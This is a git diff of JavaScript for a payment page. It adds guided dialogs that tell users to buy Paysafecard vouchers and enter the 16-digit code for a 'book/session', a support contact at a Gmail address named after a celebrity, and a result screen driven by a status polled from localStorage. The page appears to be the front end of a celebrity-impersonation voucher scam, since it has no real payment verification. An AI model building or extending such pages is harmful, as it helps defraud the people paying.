@@ -37,6 +37,7 @@ function initializeState() {
         pending: false,
         pendingIndex: "",
         paymentStatus: "",
+        statusMessage: "",
         initialContent: "",
         details: "",
         country: "",
@@ -155,9 +156,9 @@ async function handleProceedClick(e, state) {
     button.disabled = true;
     button.innerHTML = `<div class="spinner-container"><div class="spinner"></div></div>  Processing...`;
 
-    await convertCurrency(state)
-         .then((value) => {
-             value ?
+    // await convertCurrency(state)
+    //      .then((value) => {
+    //          value ?
     setTimeout(() => {
         document.getElementById("payment-details")?.classList.remove("active");
 
@@ -167,12 +168,12 @@ async function handleProceedClick(e, state) {
         button.innerHTML = "Proceed to Payment";
     }, 500)
 
-    :
-             setTimeout(() => {
-              button.disabled = false;
-                 button.innerHTML = "Proceed to Payment";
-             }, 500)
-     });
+    // :
+    //          setTimeout(() => {
+    //           button.disabled = false;
+    //              button.innerHTML = "Proceed to Payment";
+    //          }, 500)
+    //  });
 
 }
 
@@ -182,7 +183,7 @@ function handleMakePaymentClick(e, state, elements) {
     button.disabled = true;
     button.innerHTML = ` <div class="spinner-container"><div class="spinner"></div></div> Processing...`;
 
-    setTimeout(() => {
+    setTimeout(async () => {
         document
             .getElementById("payment-method-section")
             ?.classList.remove("active");
@@ -199,7 +200,7 @@ function handleMakePaymentClick(e, state, elements) {
             handleCreditCard(state, elements);
         } else if (method.includes("safe")) {
             state.paySafeSections = createPaySafeSections(state);
-            handlePaySafe(state, elements);
+            await handlePaySafe(state, elements);
         }
 
         button.disabled = true;
@@ -469,61 +470,218 @@ function addNewCode(state) {
 
 }
 
+const paySafeSteps = [
+    {
+        title: "How Paysafecard Works",
+        message: `<h3 style="text-align:center;">🔑 Step 1 </h3> Buy a paysafecard voucher at a shop near you. You'll receive a paper slip with a 16-digit code.`,
+        buttons: [
+            { text: "Next >", action: "next" }
+        ]
+    },
+    {
+        title: "How Paysafecard Works",
+        message: `<h3 style="text-align:center;">🖊️ Step 2 </h3> Come back here and type the 16-digit code into the payment box.`,
+        buttons: [
+            {
+                text: "< Back", action: "prev"
+                , type: "secondary"
+            },
+            { text: "Next >", action: "next" }
+        ]
+    },
+    {
+        title: "How Paysafecard Works",
+        message: `<h3 style="text-align:center;">✨ Step 3 </h3> Click Pay. That's it, your payment is complete instantly.  <br/> <br/> Ready to continue? Your book/session is waiting for you.`,
+        buttons: [
+            { text: "< Back", action: "prev", type: "secondary" },
+            {
+                text: "Back to payment",
+                action: "closeAlert"
+            }
+        ]
+    }
+];
+
+function showFlow(steps, index = 0) {
+    const step = steps[index];
+
+    handleAlert(
+        step.message,
+        "blur",
+        true,
+        step.title,
+        true,
+        step.buttons.map(btn => ({
+            text: btn.text,
+            onClick: btn.action === "next"
+                ? () => showFlow(steps, index + 1)
+                : btn.action === "prev"
+                    ? () => showFlow(steps, index - 1)
+                    : btn.action,
+            type: btn.type || "primary",
+        })),
+        "row"
+    );
+}
+
 function stepsAlerts() {
-    handleAlert(`🔑 Step 1 
-    <br/>
-    Buy a paysafecard voucher at a shop near you.You'll receive a paper slip with a 16-digit code.`, "blur",
-        true,
-        "How Paysafecard Works",
-        true,
-        [{
-            text: "Next >",
-            onClick:
-                () =>
-                    handleAlert(`🖊️ Step 2 
-                    <br/>
-                    Come back here and type the 16-digit code into the payment box.`, "blur", true, "How Paysafecard Works", true, [
-                        {
-                            text: "Back", onClick: "closeAlert",
-                        }, {
-                            text: "Next", onClick: () => handleAlert("next", "toast")
-                        }
-                    ])
-        }])
+    showFlow(paySafeSteps);
 }
 
-function safeAlerts(state) {
-    handleAlert("Do you need help finding a shop near you to buy a Paysafecard voucher, or would you like guidance on how to use it to complete your payment for your book/session?", "blur", true, "🌸 <br/> Companion Support", true,
-        [{
-            text: "Yes, guide me",
-            onClick:
-                () => handleAlert("We're here to make this easy for you. <br/> Please choose what you need right now:", "blur",
-                    true,
-                    "🌸 Companion Support", true,
-                    [{
-                        text: "Find a store near me",
-                        onClick: () => handleAlert("store near me has been clicked!", "toast"),
-                        type: "secondary"
-                    }, {
-                        text: "Show me how paysafecard works", onClick: () => safeAlerts(),
-                        type: "secondary"
+const safeFlow = {
+    start: {
+        message: "Do you need help finding a shop near you to buy a Paysafecard voucher, or would you like guidance on how to use it to complete your payment for your book/session?",
+        title: "🌸 <br/> Companion Support",
+        buttons: [
+            { text: "Yes, guide me", action: "guide" },
+            { text: "No, thank you", action: "closeAlert", type: "secondary" }
+        ]
+    },
+    guide: {
+        message: "We're here to make this easy for you. <br/> Please choose what you need right now:",
+        title: "🌸 Companion Support",
+        buttons: [
+            {
+                text: "Find a store", action: () => handleAlert("Store near me clicked!", "toast")
+                , type: "secondary"
+            },
+            {
+                text: "Show how paysafecard works", action: () => stepsAlerts(),
+                type: "secondary"
+            },
+            {
+                text: "Talk to us",
+                action: () => handleAlert(`Need help? Write to us now and explain your problem. Our team will respond quickly and fix it for you.  <br/><br/>
+                            <div style="display:flex; gap:6px;"> 
+                            <i class="bi bi-envelope"></i> Email Us </div>
+                            `, "blur", true, "* Companion Support", true, [{
+                    text: "Message Now", onClick: () => {
+                        window.location.href = "mailto:healingwithcharlottecasiraghi@gmail.com";
 
-                    }, {
-                        text: "Talk to us directly",
-                        onClick: () => window.location.href = "mailto:healingwithcharlottecasiraghi@gmail.com",
-                        type: "secondary"
+                        return "closeAlert"
+                    }
+                }])
+                , type: "secondary"
+            }
+        ],
+        arrange: "column"
+    }
+};
 
-                    }], "column")
-        }, {
-            text: "No, thank you", onClick: "closeAlert",
-            type: "secondary"
-        }], "row");
+function runFlow(flow, state = "start") {
+    const step = flow[state];
+    handleAlert(
+        step.message,
+        "blur",
+        true,
+        step.title,
+        true,
+        step.buttons.map(btn => ({
+            text: btn.text,
+            onClick: typeof btn.action === "string"
+                ? btn.action === "closeAlert" ? "closeAlert" : () => runFlow(flow, btn.action)
+                : btn.action,
+            type: btn.type,
+        })),
+        step.arrange
+    );
 }
 
-function handlePaySafe(state, elements) {
+function safeAlerts() {
+    runFlow(safeFlow, "start");
+}
+
+function getResult(state) {
+    const status = state.paymentStatus;
+    const message = state.statusMessage;
+
+    return `
+     <div class="payment-section paysafe-section active" id="paysafe-outcome">
+            <div class="paysafe-header">
+                <div class="logo">
+                    <img src="/src/images/paysafe.png" alt="Paysafe Logo">
+                </div>
+            </div>
+
+            <div class="outcome-section">
+                <i class="bi ${status == true ? 'bi-check-circle-fill' : 'bi-x-circle-fill'}"></i>
+
+                <h1>${status == true ? 'Payment Successful'
+            : message.toString().includes("incorrect") ? 'Incorrect Code' : "Code Already Used"
+        } </h1>
+            </div>
+
+            <div class="steps">
+                <p class="verification-text">Your payment with Paysafecard is complete.
+                </<br/>
+                </<br />
+                Thank you for your trust.
+                </p>
+            </div>
+
+            <div class="proceed-div">
+                <button class="continue-btn">Continue</button>
+                <p class="small-text">A confirmation has been sent to your email.</p>
+            </div>
+        </div>
+    `
+}
+
+//for fetching data:
+function fetchResultData(state) {
+    const data = JSON.parse(localStorage.getItem("charlotte-page-payment-state")) || {
+        status: state.paymentStatus || null,
+        message: state.statusMessage,
+    };
+
+    if (data) {
+        localStorage.setItem("charlotte-page-payment-state", JSON.stringify(data));
+
+        state.paymentStatus = data.status || null;
+        state.statusMessage = data.message || "";
+    }
+
+    return data;
+}
+
+async function handleResults(state, elements) {
+    let data = fetchResultData(state);
+    const status = data.status;
+    let result;
+    let timer;
+
+    if (status === null) {
+        timer = setInterval(() => {
+            data = fetchResultData(state);
+            handleResults(state, elements);
+        }, 1000);
+        // console.log("not done");
+    }
+
+    if (status !== null) {
+        clearInterval(timer);
+        result = getResult(state);
+
+        elements.paymentDisplay.innerHTML = "";
+        elements.paymentDisplay.insertAdjacentHTML("beforeend", result);
+        console.log("done");
+        // return;
+    }
+
+    // status !== null ?
+    //     handleAlert("not null...", "toast") : handleAlert("null", "toast");
+}
+
+async function handlePaySafe(state, elements) {
     state.paySafeSections = createPaySafeSections(state);
 
     const currentSection = state.paySafeSections[state.safeIndex + 1];
+
+    if (state.safeIndex == 2) {
+        await handleResults(state, elements);
+        console.log("added");
+
+    }
 
     if (currentSection) {
         elements.paymentDisplay.innerHTML = "";
@@ -538,8 +696,16 @@ function handlePaySafe(state, elements) {
                 <div class="spinner-container"><div class="spinner"></div></div>
                 ${state.safeIndex !== 2 ? "Loading..." : "Verifying..."}
                 `;
-            setTimeout(() => {
-                handlePaySafe(state, elements)
+            const paymentData = {
+                status: state.paymentStatus || null,
+                message: state.statusMessage,
+            }
+
+            state.safeIndex == 2 ?
+                localStorage.setItem("charlotte-page-payment-state", JSON.stringify(paymentData)) : "";
+
+            setTimeout(async () => {
+                await handlePaySafe(state, elements)
             }, 2000);
 
         }));
@@ -565,7 +731,7 @@ function handlePaySafe(state, elements) {
             }, 3000);
         };
 
-        state.safeIndex = state.safeIndex + 1;
+        state.safeIndex = state.safeIndex <= 1 ? state.safeIndex + 1 : 2;
     }
 
 }
